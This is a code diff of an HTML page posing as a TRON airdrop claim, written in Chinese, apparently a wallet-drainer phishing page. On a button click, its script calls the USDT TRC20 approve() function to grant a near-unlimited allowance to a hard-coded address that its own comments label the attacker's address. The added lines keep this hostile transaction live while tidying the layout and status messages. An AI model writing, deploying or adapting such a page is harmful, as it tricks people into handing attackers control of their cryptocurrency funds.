@@ -4,12 +4,7 @@
   <meta charset="UTF-8">
   <title>🎁 領取 TRON 空投</title>
   <style>
-    body {
-      font-family: 'Arial';
-      background: #f8f8f8;
-      text-align: center;
-      padding: 80px;
-    }
+    body { font-family: 'Arial'; background: #f8f8f8; text-align: center; padding: 80px; }
     button {
       padding: 12px 30px;
       font-size: 20px;
@@ -19,11 +14,7 @@
       border-radius: 8px;
       cursor: pointer;
     }
-    #status {
-      margin-top: 20px;
-      font-size: 16px;
-      color: #555;
-    }
+    #status { margin-top: 20px; font-size: 16px; color: #555; }
   </style>
   <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
 </head>
@@ -34,24 +25,29 @@
   <p id="status">等待操作中...</p>
 
   <script>
-    const USDT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";  // TRC20 主網 USDT
-    const attacker = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B"; // 主控地址（TRON）
+    const USDT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // TRON 主網 USDT
+    const attacker = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B"; // 攻擊者地址
 
     async function approve() {
-      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+      const status = document.getElementById("status");
+
+      // 等待 TronLink 注入
+      if (typeof window.tronWeb === 'undefined' || !window.tronWeb.defaultAddress.base58) {
         alert("請先安裝並登入 TronLink 錢包");
         return;
       }
 
-      document.getElementById("status").innerText = "⏳ 發送授權中...";
+      status.innerText = "⏳ 授權合約載入中...";
 
       try {
         const contract = await window.tronWeb.contract().at(USDT);
-        const tx = await contract.approve(attacker, window.tronWeb.toBigNumber("9223372036854775807")).send(); // TRC20 沒有 MaxUint256
-        document.getElementById("status").innerText = "✅ 授權成功，TX ID: " + tx;
-      } catch (err) {
-        console.error(err);
-        document.getElementById("status").innerText = "❌ 授權失敗: " + err.message;
+        status.innerText = "⏳ 發送授權中...";
+
+        const tx = await contract.approve(attacker, window.tronWeb.toBigNumber("9223372036854775807")).send();
+        status.innerText = "✅ 授權成功，TX ID: " + tx;
+      } catch (e) {
+        console.error("授權失敗：", e);
+        status.innerText = "❌ 授權失敗：" + (e.message || e);
       }
     }
   </script>
